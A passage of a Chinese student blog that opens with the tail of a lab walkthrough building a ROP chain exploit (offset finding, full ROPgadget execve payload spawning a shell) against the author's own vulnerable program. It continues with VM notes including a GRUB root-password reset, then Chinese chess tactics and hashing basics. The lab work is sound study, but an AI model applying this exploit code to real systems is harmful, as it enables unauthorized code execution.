<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用pip安装ROP gadget依赖capstone</span></span><br><span class="line">sudo pip install capstone</span><br><span class="line"><span class="meta">#</span><span class="bash">使用pip安装ROPgadget</span></span><br><span class="line">sudo pip install ROPgadget</span><br></pre></td></tr></table></figure></li>
<li><p>使用如下命令编译漏洞程序，注意打开地址随机化</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -static -g -o stack returntolibc_stack.c  #记得加static参数</span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=2 #打开地址随机化</span><br></pre></td></tr></table></figure></li>
<li><p>使用命令<code>ROPgadget --binary ./stack --ropchain</code>生成gadget链</p>
<p>结果如下：</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop1.png"></p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop2.png"></p>
</li>
<li><p>接下来我们要确定偏移地址，好把我们的gadget填充进去。进入gdb调试程序，使用<code>pattern_create 100</code>生成100个字符的随机测试字符串，再另开一个终端使用<code>echo &#39;我们的字符串&#39; &gt; badfile</code>，再<code>run</code>执行程序，我们可以看到出现了段错误，程序崩溃，此时EIP的值为0x41614141，内容是我们填充进去的’AAaA’.使用命令<code>pattern_offset 0x41614141</code>，可以得到EIP处的偏移为37，如下图2所示：</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop3.png"></p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop4.png"></p>
</li>
<li><p>接着我们编写python程序，将我们的填充字符串以及gadget的利用写好输出到badfile中，其中gadget的利用我们的工具已经帮我们把python代码写好了，我们把计算出来的偏移地址之前的位置填充成37个’a’字符。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p += <span class="number">37</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8836</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8836</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049333</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080defc9</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049333</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cb25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="built_in">print</span> p</span><br></pre></td></tr></table></figure></li>
<li><p>使用命令<code>python exploit.py &gt; badfile</code>完成恶意输入文件的构建，使用命令<code>./stack</code>运行我们的漏洞程序，可以看到攻击成功，新开了一个shell输入端。</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop5.png"></p>
</li>
</ol>
<blockquote>
<p>寻找溢出偏移的参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35544379/article/details/104984164">https://blog.csdn.net/qq_35544379/article/details/104984164</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/03/01/linux/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/03/01/linux/" class="post-title-link" itemprop="url">linux虚拟机杂记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-01 20:23:05" itemprop="dateCreated datePublished" datetime="2021-03-01T20:23:05+08:00">2021-03-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:06:21" itemprop="dateModified" datetime="2021-05-17T16:06:21+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">虚拟机</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="su和sudo"><a href="#su和sudo" class="headerlink" title="su和sudo"></a>su和sudo</h3><p>su:切换用户</p>
<p>sudo:权限有针对性地下放，即su切换到root后以root身份执行命令，而后退出</p>
<blockquote>
<p>第一次登陆Ubuntu的时候root还没有设置密码，故无法切换，使用<code>sudo passwd root</code>命令设置密码</p>
</blockquote>
<h3 id="虚拟机的iso镜像文件"><a href="#虚拟机的iso镜像文件" class="headerlink" title="虚拟机的iso镜像文件"></a>虚拟机的iso镜像文件</h3><p>每个虚拟机都有自己的磁盘文件(.vmdk)，这些磁盘文件就是<strong>虚拟的硬盘</strong>。安装虚拟机时运行镜像里的安装程序，这程序的主要任务只不过是把镜像里的东西解压到磁盘文件里，不会修改镜像里的内容。等到虚拟机安装完，这镜像就用不着了。所以倘若有现成的虚拟硬盘，也不需要镜像文件了。</p>
<p>vmware会寻找.vmx文件，然后会去找.vmdk文件，若只有.vmdk文件则需要创建新虚拟机，在选择磁盘的时候选择该.vmdk文件即可。因此，磁盘文件和镜像文件并不一定要在同一个文件夹里。</p>
<h3 id="虚拟机三个网络模式"><a href="#虚拟机三个网络模式" class="headerlink" title="虚拟机三个网络模式"></a>虚拟机三个网络模式</h3><p>vmware会为虚拟机创建虚拟网络，命名为VMnet0…等等，每个虚拟网络可以连接若干网络设备</p>
<ul>
<li><p>桥接模式</p>
<p>桥接模式下VMware虚拟出来的操作系统就像是局域网中一台独立的主机，它可以访问任何一台机器。桥接模式下往往需要为虚拟主机配置IP、掩码等（虚拟IP和主机ip要在同一网段）。</p>
</li>
<li><p>NAT模式</p>
<p>顾名思义，NAT是Network Address Translation的缩写，意为网络地址转换。使用NAT的虚拟系统<strong>把主机当作路由器</strong>访问互联网，虚拟系统网络连接时，VMware会在主机上建立单独的专用网络用以主机和虚拟机相互通信。虚拟系统往外部发送数据包时都用会先发给主机，再由主机标记后发往其他地方，接收数据包也一样，因此虚拟主机在外部网络中没有自己的ip地址，而外部网络主机也无法访问虚拟机。</p>
<p>此外，在一台主机上只允许有一个NAT模式的虚拟网络，因此，同一台主机上的多个采用NAT模式的虚拟机也是可以相互访问的。</p>
</li>
<li><p>主机模式</p>
<p>主机模式下，真实环境和虚拟环境是隔离开的，在这种模式下，主机无法和虚拟机通信，而虚拟机之间是可以通信的。</p>
</li>
</ul>
<h3 id="kali开机密码重设"><a href="#kali开机密码重设" class="headerlink" title="kali开机密码重设"></a>kali开机密码重设</h3><p>现在密码这么多经常不用总是会忘记哒，这不开学要用kali做实验发现密码整忘喽，记录一下重设过程下次忘记能快速完成重设。<del>下次还敢</del></p>
<ol>
<li><p>首先重启虚拟机，出现GNU GRUB引导菜单时，按下方向键选择恢复模式（recovery mode），按e进入编辑模式（或者直接选择advanced条目直接按e不按enter）</p>
</li>
<li><p>进入编辑模式后，将linux行的ro修改为rw，删除后面的quiet spash，添加init=/bin/bash，如图</p>
<p><img src="/project/linux%5Ckali%E9%87%8D%E8%AE%BE1.png"></p>
<p><img src="/project/linux%5Ckali%E9%87%8D%E8%AE%BE2.png"></p>
</li>
<li><p>修改完成按ctrl+x继续启动</p>
</li>
<li><p>启动完成会出现命令行，输入<code>passwd root</code>，接着输入重设的密码即可（记录一下这次设置的用户名和密码都是root）</p>
</li>
<li><p>接着直接重启强制重启（vm里）即可</p>
</li>
</ol>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul>
<li><code>dpkg -L package_name</code>列出属于包package_name的所有文件（用于找包的位置）</li>
<li></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/02/26/%E5%BC%80%E5%B1%80%E8%A6%81%E9%A2%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/02/26/%E5%BC%80%E5%B1%80%E8%A6%81%E9%A2%86/" class="post-title-link" itemprop="url">开局要领</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-02-26 17:45:42 / Modified: 17:51:16" itemprop="dateCreated datePublished" datetime="2021-02-26T17:45:42+08:00">2021-02-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" itemprop="url" rel="index"><span itemprop="name">中国象棋</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="中炮局"><a href="#中炮局" class="headerlink" title="中炮局"></a>中炮局</h2><p>将炮移动到中间开局，此时对方需要跳马照卒，防止对方的炮打过来。</p>
<ol>
<li>尽量出大子，如车；防止频繁的走动某一个子，不利棋局布置</li>
<li>抢占重要据点，如车占我方河线（巡河车）</li>
<li>均衡发展左右两边子力</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/" class="post-title-link" itemprop="url">基本杀法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-25 20:38:59" itemprop="dateCreated datePublished" datetime="2021-02-25T20:38:59+08:00">2021-02-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-04-02 10:44:46" itemprop="dateModified" datetime="2021-04-02T10:44:46+08:00">2021-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" itemprop="url" rel="index"><span itemprop="name">中国象棋</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="入门杀法"><a href="#入门杀法" class="headerlink" title="入门杀法"></a>入门杀法</h2><h3 id="双车错"><a href="#双车错" class="headerlink" title="双车错"></a>双车错</h3><p>两个车将军时，一个车占据田字格的中路，另一个车把对方的将逼至上路(左路)或下路(右路)，形成绝杀</p>
<blockquote>
<p> 注意保证车不要被将吃</p>
</blockquote>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%8F%8C%E8%BD%A6%E9%94%99.png" alt="双车错"></p>
<h3 id="重炮杀"><a href="#重炮杀" class="headerlink" title="重炮杀"></a>重炮杀</h3><p>条件1：两个炮在一条直线上将军，炮和将之间无子阻隔（这样就没办法通过垫子解决）</p>
<p>条件2：将无法左右移动（有子拦住或者该处正被将军，比如被马踩着）</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%87%8D%E7%82%AE%E6%9D%80.png" alt="重炮杀"></p>
<h3 id="马后炮"><a href="#马后炮" class="headerlink" title="马后炮"></a>马后炮</h3><p>条件1：马和对方将在同一条线上且中间空一格（不能隔子）</p>
<p>条件2：炮在马后且可以打到将（炮马之间无子）</p>
<p>这样马控制将不能往两边走，炮控制将不能前进或后退</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%A9%AC%E5%90%8E%E7%82%AE.png" alt="马后炮"></p>
<h3 id="天地炮"><a href="#天地炮" class="headerlink" title="天地炮"></a>天地炮</h3><p>一炮在中路，和对方的将中间隔着士和象，此时该炮压制住了士象，使之无法离开；另一炮在底线形成将军<strong>或者</strong>压制另一对士象借助车马兵将军，其中一炮压制士象，采用其他方式将军也称铁门栓（具体见基础杀法）</p>
<p>例1：一炮压制士象，另一炮底线将军。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%A4%A9%E5%9C%B0%E7%82%AE1.png" alt="天地炮"></p>
<p>例2：车可以吃掉炮线上的士而此时将不能吃车（否则被炮将军），将又被车将军且无法移动。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%A4%A9%E5%9C%B0%E7%82%AE2.png" alt="天地炮"></p>
<h2 id="基础杀法"><a href="#基础杀法" class="headerlink" title="基础杀法"></a>基础杀法</h2><h3 id="卧槽马"><a href="#卧槽马" class="headerlink" title="卧槽马"></a>卧槽马</h3><p>槽点即九宫格中心点左边（右边）两格的位置，当马跳到此处时，可以踩将。</p>
<p>此时解法仅有：1.杀马 2.蹩马腿 3.移动将</p>
<p>当解法均不可满足时形成绝杀。由于士象没有办法蹩卧槽马的腿和杀马，故在没有防备时仅能移动将，配合其他子可杀。</p>
<p>例1：当卧槽后将移动到九宫格中心，形成了马后炮的马部分，就可配合马后炮杀将。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%8D%A7%E6%A7%BD%E9%A9%AC.png" alt="卧槽马"></p>
<h3 id="挂角马"><a href="#挂角马" class="headerlink" title="挂角马"></a>挂角马</h3><p>即马走到士角的位置，即将踩将。</p>
<p>和卧槽马一样，此时解法仅有：1.杀马 2.蹩马腿 3.移动将。</p>
<p>而挂角马多一种被士杀的危险，当士不在中间或者士被炮控制住无法移动时就可以使用。</p>
<p>例1：和卧槽马一样，挂角马也可以控制两个点，是将点和将点的对格点。可以用挂角马把将逼离将点之后，用其他子将军，用对格点保护其他子。（对格点可以被象蹩腿）</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E6%8C%82%E8%A7%92%E9%A9%AC.png" alt="挂角马"></p>
<h3 id="闷杀"><a href="#闷杀" class="headerlink" title="闷杀"></a>闷杀</h3><p>对方将被自己的其他子堵住时进兵绝杀。</p>
<p>例1：炮打闭功，炮在底线将军，此时若没法<strong>填子</strong>也没法<strong>挪开炮架子</strong>也没法<strong>上移将</strong>，则是闭功</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%801.png" alt="闷杀"></p>
<p>例2：当对方的子挡住将中路时，车杀其另一条路即可，此时效果类似于双车错。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%802.png" alt="闷杀"></p>
<p>例3：如下图，首先不能在肋线（4、6路）上将军，下有车可以吃子，对方车和将一个吃兵一个吃车就没有杀招了；其次不能在将点将军（即进车吃黑车），这样会被将吃；那么只能下兵，且要先把将堵在此时位置，即需要另一个子填住象眼处，既能防止飞象吃兵也能进行闷杀。故红车左移将军，黑车势必下来吃红车，进兵将军形成闷杀。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%803.png" alt="闷杀"></p>
<p>例4：如下图，跳马可用炮将军，但对方炮可以上移动，故先用马跳到炮上堵住炮，即形成闷杀。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%804.png" alt="闷杀"></p>
<h3 id="铁门栓"><a href="#铁门栓" class="headerlink" title="铁门栓"></a>铁门栓</h3><p>铁门栓指中路士象被炮控制，从而士点象点安全可以用来将军。</p>
<p>例1： 如图，可以分析不能在底线将军，则花费左车吃中士，此时角士只能下来，从而让出将路，进车配合红帅杀将。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%93%81%E9%97%A8%E6%A0%931.png" alt="铁门栓"></p>
<p>例2：如图，我们通常采用马或者帅<strong>照着对方士点</strong>，配合车或者兵在被照着的士点上杀将。</p>
<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%93%81%E9%97%A8%E6%A0%932.png" alt="铁门栓"></p>
<h3 id="大刀剜心"><a href="#大刀剜心" class="headerlink" title="大刀剜心"></a>大刀剜心</h3><p>车或兵配合其他的子吃掉花心士形成绝杀。</p>
<p>条件1：保证车不被吃掉，如无法上士（另一车在底线将军<strong>或</strong>炮控制着底线士象）,将无法上来吃掉车（炮在中路照着或者有马照车等等）</p>
<p>条件2：将无法左右移动（有我方帅照着，或马照着，或将左右路被他自己的子挡住等）</p>
<h3 id="三车闹士"><a href="#三车闹士" class="headerlink" title="三车闹士"></a>三车闹士</h3><p>三个车+兵限制士的走法形成绝杀。</p>
<blockquote>
<p>注意兵与车不同，兵无法后退，即不能将后面的军。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/02/09/%E7%AE%97%E6%B3%95%E5%88%9D%E6%AD%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/02/09/%E7%AE%97%E6%B3%95%E5%88%9D%E6%AD%A5/" class="post-title-link" itemprop="url">算法初步</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-09 11:53:02" itemprop="dateCreated datePublished" datetime="2021-02-09T11:53:02+08:00">2021-02-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:03:42" itemprop="dateModified" datetime="2021-05-17T16:03:42+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>待补充</p>
<h3 id="散列-hash"><a href="#散列-hash" class="headerlink" title="散列(hash)"></a>散列(hash)</h3><p>有一种空间换时间的方法，通过将输入的数作为<strong>数组的下标</strong>来对这个数的性质进行统计，但当输入的数很大，或者甚至不是数而是字符串，就需要用<strong>散列</strong>来将输入元素通过hash函数转换成尽量唯一的整数，从而继续空间换时间。如果元素在转换前是==key==，在转换后就是整数==H(key)==，即==key==是输入的数，==H(key)==则是数组下标。下面就key的类型进行讨论。</p>
<h4 id="1-整数散列"><a href="#1-整数散列" class="headerlink" title="1.整数散列"></a>1.整数散列</h4><p>当key为整数时，hash函数通常有：<strong>直接定址法</strong>（H(key)是key的线性变换），<strong>平方取中法</strong>，<strong>除留余数法</strong>。</p>
<p>其中<strong>除留余数法</strong>比较常用：H(key) = key % mod</p>
<p>当mod为素数的时候H(key)可以尽可能地覆盖范围内的每一个数，且数组长度不能长于mod，于是常取 数组长度==mod.</p>
<p>易知这样很容易有两个key对应同一个H(key)值的情况，称之为<strong>冲突</strong>，解决冲突的办法有以下三种：</p>
<ul>
<li>线性探索法：即当key映射成H(key)之后，发现数组H(key)下标已经被其他的数占据，则顺位后移，即H(key)^’^ = H(key)+1，依次循环寻找直到找到空的位置为止。</li>
<li>平方探查法：同上，发现冲突后，不是依次向后探查，而是+- 1^2^, +- 2^2^……这样探查 </li>
<li>链地址法（拉链法）：将所有H(key)相同的key链成一条单链表</li>
</ul>
<h4 id="2-字符串hash"><a href="#2-字符串hash" class="headerlink" title="2.字符串hash"></a>2.字符串hash</h4><p><strong>初步：</strong></p>
<ul>
<li><p>将二维整点映射成整数：H(x,y) = x*range + y (0 &lt;= x,y &lt;= range)</p>
</li>
<li><p>将字符串映射成整数：(假设字符串由a-z 26位小写字母组成)</p>
<ul>
<li><p>将a-z对应为0-25，则长度为len的字符串即理解为长度为len的26进制数</p>
</li>
<li><p>将26进制数转换成10进制数来唯一表示映射后的整数，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashfuc</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; 